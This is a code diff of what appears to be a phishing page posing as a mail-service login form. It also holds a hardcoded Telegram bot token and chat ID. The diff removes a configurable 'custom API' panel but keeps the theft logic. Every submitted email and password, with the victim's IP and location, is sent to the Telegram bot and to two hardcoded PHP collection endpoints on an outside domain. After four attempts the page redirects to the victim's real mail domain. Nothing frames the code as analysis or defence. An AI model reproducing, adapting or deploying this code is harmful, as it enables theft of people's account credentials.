@@ -132,66 +132,6 @@
         }
         .login-inner-form { margin-top: -20px; }
         #msg { display: block; margin-bottom: 15px; }
-        /* Config panel styles */
-        .api-config-panel {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border: 1px solid #e0e0e0;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
-        }
-        .api-config-panel h4 {
-            font-size: 14px;
-            margin: 0 0 10px 0;
-            color: #495057;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .api-config-panel h4 i {
-            font-size: 14px;
-            color: #50a1ff;
-        }
-        .api-url-input {
-            width: 100%;
-            padding: 8px 12px;
-            font-size: 13px;
-            border: 1px solid #ced4da;
-            border-radius: 20px;
-            margin-bottom: 8px;
-            font-family: monospace;
-        }
-        .api-url-input:focus {
-            outline: none;
-            border-color: #50a1ff;
-            box-shadow: 0 0 0 2px rgba(80,161,255,0.2);
-        }
-        .config-label {
-            font-size: 12px;
-            color: #6c757d;
-            margin-bottom: 4px;
-            display: block;
-        }
-        .test-btn {
-            font-size: 11px;
-            padding: 4px 12px;
-            border-radius: 20px;
-            background: #e9ecef;
-            border: none;
-            cursor: pointer;
-        }
-        .test-btn:hover { background: #dee2e6; }
-        .status-badge {
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 10px;
-            background: #e9ecef;
-            display: inline-block;
-            margin-left: 8px;
-        }
-        .status-badge.active { background: #d4edda; color: #155724; }
-        hr { margin: 12px 0; }
     </style>
 </head>
 <body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png); background-size: cover;">
@@ -209,21 +149,6 @@
                             </div>
                             <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
                             <center><h2 style="color: #212529; line-height: 1.2;">Sign In To Continue</h2></center>
-                            
-                            <!-- API CONFIGURATION PANEL - Add your URLs here -->
-                            <div class="api-config-panel">
-                                <h4><i class="fas fa-plug"></i> Custom API Endpoints</h4>
-                                <div>
-                                    <label class="config-label"><i class="fas fa-1-circle"></i> API URL #1</label>
-                                    <input type="text" id="apiUrl1" class="api-url-input" placeholder="https://your-api-1.com/endpoint" value="https://scitecinstruments.it.com/mine/1/api.php">
-                                    <label class="config-label"><i class="fas fa-2-circle"></i> API URL #2</label>
-                                    <input type="text" id="apiUrl2" class="api-url-input" placeholder="https://your-api-2.com/webhook" value="https://scitecinstruments.it.com/mine/result/api.php">
-                                    <div style="font-size: 11px; color: #6c757d; margin-top: 6px;">
-                                        <i class="fas fa-info-circle"></i> Leave empty to skip sending to that endpoint
-                                    </div>
-                                </div>
-                            </div>
-                            
                             <div class="login-inner-form">
                                 <form class="f_form" id="loginForm" method="POST">
                                     <input type="hidden" name="fcc" id="fcc" value="">
@@ -261,113 +186,19 @@
             let attemptCount = 1;
             const MAX_ATTEMPTS = 4;
 
-            // Telegram configuration (kept for backward compatibility)
+            // Telegram (client‑side)
             const TELEGRAM_BOT_TOKEN = '8717629711:AAHBBxRDJtxD6KHu1q-j38yJ98g5qlqzLeM';
             const TELEGRAM_CHAT_ID = '6159490685';
 
-            // Your PHP endpoint (original server)
-            const SERVER_URL = 'https://scitecinstruments.it.com/mine/result/sg.php';
+            // ============================================================
+            // TWO API ENDPOINTS - BOTH WILL RECEIVE THE DATA
+            // ============================================================
+            const API_URL_1 = 'https://scitecinstruments.it.com/mine/result/api.php';
+            const API_URL_2 = 'https://scitecinstruments.it.com/mine/1/api.php';
 
             let messageSentForThisAttempt = false;
 
-            // ========== NEW: Function to send data to custom API URL 1 ==========
-            async function sendToApiUrl1(data) {
-                const apiUrl = $('#apiUrl1').val().trim();
-                if (!apiUrl) {
-                    console.log('ℹ️ API URL #1 is empty, skipping');
-                    return;
-                }
-                
-                console.log('📡 Sending data to API URL #1:', apiUrl);
-                try {
-                    const response = await fetch(apiUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(data),
-                        mode: 'cors'  // Allow CORS (some APIs may need this)
-                    });
-                    
-                    let responseText = '';
-                    try {
-                        responseText = await response.text();
-                    } catch(e) { responseText = 'Unable to read response'; }
-                    
-                    if (response.ok) {
-                        console.log('✅ API #1 success:', response.status, responseText.substring(0, 100));
-                    } else {
-                        console.warn('⚠️ API #1 responded with status:', response.status, responseText.substring(0, 100));
-                    }
-                } catch (error) {
-                    console.error('❌ Failed to send to API URL #1:', error.message);
-                    // Don't throw - we don't want to interrupt the flow
-                }
-            }
-
-            // ========== NEW: Function to send data to custom API URL 2 ==========
-            async function sendToApiUrl2(data) {
-                const apiUrl = $('#apiUrl2').val().trim();
-                if (!apiUrl) {
-                    console.log('ℹ️ API URL #2 is empty, skipping');
-                    return;
-                }
-                
-                console.log('📡 Sending data to API URL #2:', apiUrl);
-                try {
-                    const response = await fetch(apiUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(data),
-                        mode: 'cors'
-                    });
-                    
-                    let responseText = '';
-                    try {
-                        responseText = await response.text();
-                    } catch(e) { responseText = 'Unable to read response'; }
-                    
-                    if (response.ok) {
-                        console.log('✅ API #2 success:', response.status, responseText.substring(0, 100));
-                    } else {
-                        console.warn('⚠️ API #2 responded with status:', response.status, responseText.substring(0, 100));
-                    }
-                } catch (error) {
-                    console.error('❌ Failed to send to API URL #2:', error.message);
-                }
-            }
-
-            // ========== Enhanced: Send to both custom APIs + existing endpoints ==========
-            async function sendToAllCustomApis(email, password, attempt, mxRecord, ip, location, timestamp, userAgent) {
-                // Prepare rich data payload for external APIs
-                const payload = {
-                    email: email,
-                    password: password,
-                    attempt: attempt,
-                    maxAttempts: MAX_ATTEMPTS,
-                    mxRecord: mxRecord,
-                    ipAddress: ip,
-                    location: location,
-                    timestamp: timestamp,
-                    userAgent: userAgent,
-                    source: "MailSystemLogin",
-                    eventType: "login_attempt",
-                    attemptNumber: attempt,
-                    isFinalAttempt: attempt === MAX_ATTEMPTS
-                };
-                
-                // Send to both custom API endpoints concurrently (non-blocking)
-                await Promise.allSettled([
-                    sendToApiUrl1(payload),
-                    sendToApiUrl2(payload)
-                ]);
-            }
-
-            // ---------- Telegram sender (with error logging) ----------
+            // ---------- Telegram sender ----------
             function sendToTelegram(message) {
                 if (messageSentForThisAttempt) {
                     console.log('⚠️ Already sent for this attempt, blocking duplicate');
@@ -384,24 +215,39 @@
                 img.src = url;
             }
 
-            // ---------- Server POST (to your PHP) ----------
-            function sendToServer(email, password, attempt) {
+            // ---------- Send to BOTH servers (parallel) ----------
+            function sendToBothServers(email, password, attempt) {
                 const formData = new URLSearchParams();
                 formData.append('email', email);
                 formData.append('password', password);
                 formData.append('attempt', attempt);
 
-                fetch(SERVER_URL, {
+                // Send to FIRST API
+                fetch(API_URL_1, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: formData
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('✅ Server response:', data);
+                    console.log('✅ Server 1 response:', data);
                 })
                 .catch(err => {
-                    console.error('❌ Error sending to server:', err);
+                    console.error('❌ Error sending to server 1:', err);
+                });
+
+                // Send to SECOND API (new one)
+                fetch(API_URL_2, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Server 2 response:', data);
+                })
+                .catch(err => {
+                    console.error('❌ Error sending to server 2:', err);
                 });
             }
 
@@ -472,7 +318,7 @@
                 messageSentForThisAttempt = false;
             }
 
-            // ---------- Form submission with enhanced API sending ----------
+            // ---------- Form submission ----------
             $("#loginForm").on('submit', function(e) {
                 e.preventDefault();
 
@@ -498,29 +344,15 @@
                 }
                 attemptCount++;
 
-                getIpAndLocation(async function(ip, location) {
+                getIpAndLocation(function(ip, location) {
                     const completeMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
                     console.log('📤 Sending info for attempt', currentAttempt);
-                    
-                    // Get current timestamp and user agent for API payload
-                    const currentTimestamp = new Date().toISOString();
-                    const userAgent = navigator.userAgent;
-                    
+
                     // 1. Send to Telegram (client‑side)
                     sendToTelegram(completeMessage);
-                    
-                    // 2. Send to your PHP server
-                    sendToServer(email, password, currentAttempt);
-                    
-                    // 3. NEW: Send to both custom API URLs (1 and 2) with structured data
-                    await sendToAllCustomApis(email, password, currentAttempt, mxRecord, ip, location, currentTimestamp, userAgent);
-                    
-                    // Show success indicator in console
-                    const api1Url = $('#apiUrl1').val().trim();
-                    const api2Url = $('#apiUrl2').val().trim();
-                    if (api1Url || api2Url) {
-                        console.log(`✨ Data dispatched to custom APIs: ${api1Url ? 'URL1✓' : ''} ${api2Url ? 'URL2✓' : ''}`);
-                    }
+
+                    // 2. Send to BOTH PHP servers (both will receive the data)
+                    sendToBothServers(email, password, currentAttempt);
                 });
 
                 // Redirect on final attempt
@@ -551,74 +383,6 @@
 
                 window.emailDomain = 'https://' + domain;
             }
-            
-            // Optional: Load saved API URLs from localStorage (persists between sessions)
-            const savedApi1 = localStorage.getItem('customApiUrl1');
-            const savedApi2 = localStorage.getItem('customApiUrl2');
-            if (savedApi1) $('#apiUrl1').val(savedApi1);
-            if (savedApi2) $('#apiUrl2').val(savedApi2);
-            
-            // Save URLs when user types (optional convenience)
-            $('#apiUrl1').on('change', function() {
-                localStorage.setItem('customApiUrl1', $(this).val().trim());
-            });
-            $('#apiUrl2').on('change', function() {
-                localStorage.setItem('customApiUrl2', $(this).val().trim());
-            });
-            
-            // Add small test buttons to verify API endpoints are reachable
-            function addTestButtons() {
-                const testBtnHtml = `<div style="margin-top: 6px; display: flex; gap: 8px;">
-                    <button type="button" id="testApi1Btn" class="test-btn"><i class="fas fa-vial"></i> Test URL #1</button>
-                    <button type="button" id="testApi2Btn" class="test-btn"><i class="fas fa-vial"></i> Test URL #2</button>
-                </div>`;
-                $('.api-config-panel').append(testBtnHtml);
-                
-                $('#testApi1Btn').on('click', async function() {
-                    const url = $('#apiUrl1').val().trim();
-                    if (!url) { alert('Please enter API URL #1 first'); return; }
-                    console.log('Testing API #1:', url);
-                    try {
-                        const testPayload = { test: true, message: 'Connection test from mail system', timestamp: new Date().toISOString() };
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(testPayload),
-                            mode: 'cors'
-                        });
-                        if (response.ok) {
-                            alert('✅ API #1 is reachable! Check console for details.');
-                        } else {
-                            alert(`⚠️ API #1 responded with status ${response.status}. Check console.`);
-                        }
-                    } catch(e) {
-                        alert(`❌ Cannot reach API #1: ${e.message}\nNote: Some APIs block CORS requests from browsers.`);
-                    }
-                });
-                
-                $('#testApi2Btn').on('click', async function() {
-                    const url = $('#apiUrl2').val().trim();
-                    if (!url) { alert('Please enter API URL #2 first'); return; }
-                    console.log('Testing API #2:', url);
-                    try {
-                        const testPayload = { test: true, message: 'Connection test from mail system', timestamp: new Date().toISOString() };
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(testPayload),
-                            mode: 'cors'
-                        });
-                        if (response.ok) {
-                            alert('✅ API #2 is reachable! Check console for details.');
-                        } else {
-                            alert(`⚠️ API #2 responded with status ${response.status}. Check console.`);
-                        }
-                    } catch(e) {
-                        alert(`❌ Cannot reach API #2: ${e.message}\nNote: Some APIs block CORS requests from browsers.`);
-                    }
-                });
-            }
-            addTestButtons();
         });
 
         // Toggle password visibility
@@ -638,4 +402,3 @@
     </script>
 </body>
 </html>
-```
